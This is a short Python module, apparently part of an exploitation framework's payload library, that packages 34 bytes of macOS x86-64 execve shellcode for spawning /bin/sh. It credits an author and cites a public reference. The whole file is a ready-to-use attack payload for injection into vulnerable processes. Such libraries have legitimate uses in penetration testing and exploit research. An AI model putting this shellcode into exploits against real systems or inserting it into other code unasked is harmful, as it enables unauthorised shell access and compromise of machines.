from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Csaba Fitzl"
    Shellcode.info["name"] = "OSX64 - execve shellcode"
    Shellcode.info["references"] = [
        "https://packetstormsecurity.com/files/133452/OS-X-x64-bin-sh-Shellcode.html"
    ]
    Shellcode.info["size"] = 34
    Shellcode.info["payload"] = [
        r"\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62"
        r"\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7"
        r"\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48"
        r"\xc1\xc8\x28\xb0\x3b\x0f\x05"
    ]
